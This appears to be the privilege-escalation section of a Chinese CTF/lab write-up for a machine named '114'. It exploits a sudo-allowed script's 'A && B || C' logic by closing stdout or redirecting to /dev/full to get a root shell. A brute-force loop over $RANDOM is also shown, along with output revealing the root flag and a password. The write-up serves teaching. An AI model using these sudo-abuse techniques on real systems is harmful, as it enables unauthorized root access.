<h1 id="3-提权"><a href="#3-提权" class="headerlink" title="3.提权"></a>3.提权</h1><h3 id="sudo-l"><a href="#sudo-l" class="headerlink" title="sudo -l"></a>sudo -l</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">welcome@114:~$ <span class="built_in">sudo</span> -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> welcome on 114:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User welcome may run the following commands on 114:</span><br><span class="line">    (ALL) NOPASSWD: /opt/read.sh</span><br><span class="line">    (ALL) NOPASSWD: /opt/short.sh</span><br></pre></td></tr></table></figure>


<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">welcome@114:~$ <span class="built_in">cat</span> /opt/read.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Input the flag:&quot;</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">head</span> -1 | grep -q <span class="string">&quot;<span class="subst">$(&lt; /root/root.txt)</span>&quot;</span></span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Y&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;N&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">welcome@114:~$ <span class="built_in">cat</span> /opt/short.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">PATH=/usr/bin</span><br><span class="line">My_guess=<span class="variable">$RANDOM</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;This is script logic&quot;</span></span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF</span></span><br><span class="line"><span class="string">if [ &quot;$1&quot; != &quot;$My_guess&quot; ] ;then</span></span><br><span class="line"><span class="string">    echo &quot;Nop&quot;; </span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">    bash -i;</span></span><br><span class="line"><span class="string">fi</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line">[ <span class="string">&quot;<span class="variable">$1</span>&quot;</span> != <span class="string">&quot;<span class="variable">$My_guess</span>&quot;</span> ] &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;Nop&quot;</span> || bash -i</span><br></pre></td></tr></table></figure>

<h2 id="提权方法一"><a href="#提权方法一" class="headerlink" title="提权方法一"></a>提权方法一</h2><p>一种群主提供的方法</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> /opt/short.sh <span class="string">&#x27;1&#x27;</span> &gt;&amp;-</span><br></pre></td></tr></table></figure>

<p>这里的核心在于末尾的 <code>&gt;&amp;-</code>。在 Linux Shell 中， <code>&gt;&amp;-</code> 的意思是 关闭标准输出 (<strong>Close Standard Output &#x2F; STDOUT</strong>)。<br><code>/opt/short.sh</code> 的最后一行代码：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ <span class="string">&quot;<span class="variable">$1</span>&quot;</span> != <span class="string">&quot;<span class="variable">$My_guess</span>&quot;</span> ] &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;Nop&quot;</span> || bash -i</span><br></pre></td></tr></table></figure>

<h3 id="这是一个典型的-A-B-C-逻辑结构："><a href="#这是一个典型的-A-B-C-逻辑结构：" class="headerlink" title="这是一个典型的 A &amp;&amp; B || C 逻辑结构："></a>这是一个典型的 A &amp;&amp; B || C 逻辑结构：</h3><ol>
<li>A: [ “1”!&#x3D;”my_guess” ]（判断猜测是否错误）</li>
<li>B: echo “Nop”（输出失败提示）</li>
<li>C: bash -i（开启 Root Shell）</li>
</ol>
<h3 id="正常情况（不加-）："><a href="#正常情况（不加-）：" class="headerlink" title="正常情况（不加 &gt;&amp;-）："></a>正常情况（不加 &gt;&amp;-）：</h3><ol>
<li>你输入 ‘1’，随机数是（例如）24543。</li>
<li>A 判断成立（不相等）。</li>
<li>执行 B（echo “Nop”）。echo 成功把 “Nop” 打印到屏幕上，返回状态码 0 (Success)。</li>
<li>因为 B 成功了，根据 &amp;&amp; … || 的逻辑，C（bash -i）被跳过。</li>
<li>脚本结束。</li>
</ol>
<h3 id="加了-："><a href="#加了-：" class="headerlink" title="加了 &gt;&amp;-："></a>加了 &gt;&amp;-：</h3><ol>
<li>你输入 ‘1’，随机数是 24543。</li>
<li>A 判断成立。</li>
<li>执行 B（echo “Nop”）。<ul>
<li>关键点：此时标准输出（STDOUT）已经被你关闭了。</li>
<li>echo 尝试往一个已关闭的文件描述符里写字。</li>
<li>echo 报错失败！（虽然你看不到报错，因为输出关了，但它的返回状态码变成了 1 或其他非零值）。</li>
</ul>
</li>
<li>因为 B 失败了，Shell 会继续寻找下一个逻辑分支。</li>
<li>逻辑变成了： A (真) &amp;&amp; B (失败) || C 。</li>
<li>触发 || 分支，执行 C ( bash -i</li>
<li>Boom! Root Shell 启动！<br>标准输出关掉了，需要恢复完整shell</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp;2 2&gt;&amp;2</span><br></pre></td></tr></table></figure>
<h3 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">welcome@114:~$ <span class="built_in">sudo</span> /opt/short.sh <span class="string">&#x27;1&#x27;</span> &gt;&amp;-</span><br><span class="line">/opt/short.sh: line 6: <span class="built_in">echo</span>: write error: Bad file descriptor</span><br><span class="line"><span class="built_in">cat</span>: write error: Bad file descriptor</span><br><span class="line">/opt/short.sh: line 15: <span class="built_in">echo</span>: write error: Bad file descriptor</span><br><span class="line">root@114:/home/welcome# <span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span>: write error: Bad file descriptor</span><br><span class="line">root@114:/home/welcome# /bin/bash -i &gt;&amp;2 2&gt;&amp;2</span><br><span class="line">root@114:/home/welcome# <span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">root@114:/home/welcome# <span class="built_in">ls</span></span><br><span class="line">user.txt</span><br><span class="line">root@114:/home/welcome# <span class="built_in">cd</span> /root</span><br><span class="line">root@114:~# <span class="built_in">ls</span></span><br><span class="line">114rrootpass.txt  root.txt</span><br><span class="line">root@114:~# <span class="built_in">cat</span> root.txt </span><br><span class="line">flag&#123;root-c3dbe270140775bb9fc6eaa2559f914f&#125;</span><br><span class="line">root@114:~# <span class="built_in">cat</span> 114rrootpass.txt </span><br><span class="line">6aq56zxVseLt7oApVBc1</span><br></pre></td></tr></table></figure>

<p>&#x3D;&#x3D;另一种重定向到 <code>/dev/full</code> 成功提权&#x3D;&#x3D;</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">welcome@114:~$ <span class="built_in">sudo</span> /opt/short.sh 0 &gt;/dev/full</span><br><span class="line"></span><br><span class="line">/opt/short.sh: line 6: <span class="built_in">echo</span>: write error: No space left on device</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span>: write error: No space left on device</span><br><span class="line"></span><br><span class="line">/opt/short.sh: line 15: <span class="built_in">echo</span>: write error: No space left on device</span><br><span class="line"></span><br><span class="line">root@114:/home/welcome# <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">ls</span>: write error: No space left on device</span><br><span class="line"></span><br><span class="line">root@114:/home/welcome# <span class="built_in">id</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">id</span>: write error: No space left on device</span><br><span class="line"></span><br><span class="line">root@114:/home/welcome# <span class="built_in">exec</span> 1&gt;/dev/tty</span><br><span class="line"></span><br><span class="line">root@114:/home/welcome# <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line">exp.sh user.txt</span><br></pre></td></tr></table></figure>


<h2 id="提权方法二"><a href="#提权方法二" class="headerlink" title="提权方法二"></a>提权方法二</h2><p>写爆破脚本撞大运拿shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 修复终端设置，防止之前操作导致的乱码或回显丢失</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">stty</span> sane</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[-] 正在启动爆破...&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[-] 过滤规则：屏蔽 &#x27;Nop&#x27; 和脚本逻辑文本&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[-] 状态提示：当屏幕停止滚动，或出现 &#x27;#&#x27; 提示符时，说明已拿到 Root Shell！&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[-] 注意：如果看起来卡住了，请尝试直接输入 &#x27;id&#x27; 并回车。&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;==========================================================&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 循环爆破 0 - 33000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;0..33000&#125;; <span class="keyword">do</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 核心命令解释：</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sudo /opt/short.sh $i : 尝试猜测数字</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2&gt;/dev/null : 屏蔽错误输出</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># grep --line-buffered : 关键参数！强制 grep 按行输出，不缓存。# 这样一旦拿到 Shell，你的输入回显能立刻显示出来，不会&quot;卡死&quot;。</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">sudo</span> /opt/short.sh <span class="variable">$i</span> 2&gt;/dev/null | grep --line-buffered -v <span class="string">&quot;Nop\|script</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">logic\|if \[&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 逻辑：</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果没猜对 -&gt; 输出 Nop -&gt; 被 grep 过滤 -&gt; 屏幕无显示 -&gt; 循环继续</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果猜对了 -&gt; 启动 bash -i -&gt; grep 放行 shell 的输出 -&gt; 你接管终端</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
  </div>
</article>



    </div>
    
      <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a target="_blank" rel="noopener" href="https://github.com/zhaochoudecat">Projects</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">1.信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#gobuster"><span class="toc-number">1.1.</span> <span class="toc-text">gobuster</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ffuf"><span class="toc-number">1.2.</span> <span class="toc-text">ffuf</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81"><span class="toc-number">2.</span> <span class="toc-text">2.获取用户密码</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-number">2.1.</span> <span class="toc-text">2.1方法一</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E6%A8%A1%E5%9D%97%E8%AF%A6%E8%A7%A3"><span class="toc-number">2.1.1.</span> <span class="toc-text">关键模块详解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-number">2.2.</span> <span class="toc-text">2.2方法二</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E6%8F%90%E6%9D%83"><span class="toc-number">3.</span> <span class="toc-text">3.提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-l"><span class="toc-number">3.1.</span> <span class="toc-text">sudo -l</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-number">3.2.</span> <span class="toc-text">提权方法一</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E6%98%AF%E4%B8%80%E4%B8%AA%E5%85%B8%E5%9E%8B%E7%9A%84-A-B-C-%E9%80%BB%E8%BE%91%E7%BB%93%E6%9E%84%EF%BC%9A"><span class="toc-number">3.2.1.</span> <span class="toc-text">这是一个典型的 A &amp;&amp; B || C 逻辑结构：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E5%B8%B8%E6%83%85%E5%86%B5%EF%BC%88%E4%B8%8D%E5%8A%A0-%EF%BC%89%EF%BC%9A"><span class="toc-number">3.2.2.</span> <span class="toc-text">正常情况（不加 &gt;&amp;-）：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E4%BA%86-%EF%BC%9A"><span class="toc-number">3.2.3.</span> <span class="toc-text">加了 &gt;&amp;-：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C"><span class="toc-number">3.2.4.</span> <span class="toc-text">执行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-number">3.3.</span> <span class="toc-text">提权方法二</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://zhaochoudecat.github.io/2026/01/19/QQGroup/114/114/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://zhaochoudecat.github.io/2026/01/19/QQGroup/114/114/&text="><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://zhaochoudecat.github.io/2026/01/19/QQGroup/114/114/&title="><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://zhaochoudecat.github.io/2026/01/19/QQGroup/114/114/&is_video=false&description="><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=&body=Check out this article: https://zhaochoudecat.github.io/2026/01/19/QQGroup/114/114/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://zhaochoudecat.github.io/2026/01/19/QQGroup/114/114/&title="><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://zhaochoudecat.github.io/2026/01/19/QQGroup/114/114/&title="><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://zhaochoudecat.github.io/2026/01/19/QQGroup/114/114/&title="><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://zhaochoudecat.github.io/2026/01/19/QQGroup/114/114/&title="><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://zhaochoudecat.github.io/2026/01/19/QQGroup/114/114/&name=&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
      <ul>
        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
      </ul>
    </div>

  </div>
</div>

    
    <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2026 zhaochoudecat
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a target="_blank" rel="noopener" href="https://github.com/zhaochoudecat">Projects</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

</body>
</html>
<!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">


<link rel="stylesheet" href="/lib/meslo-LG/styles.css">


<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">



<!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>


<script src="/js/main.js"></script>

<!-- Google Analytics -->

    <script type="text/javascript">
        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'UA-86660611-1', 'auto');
        ga('send', 'pageview');
    </script>

<!-- Disqus Comments -->


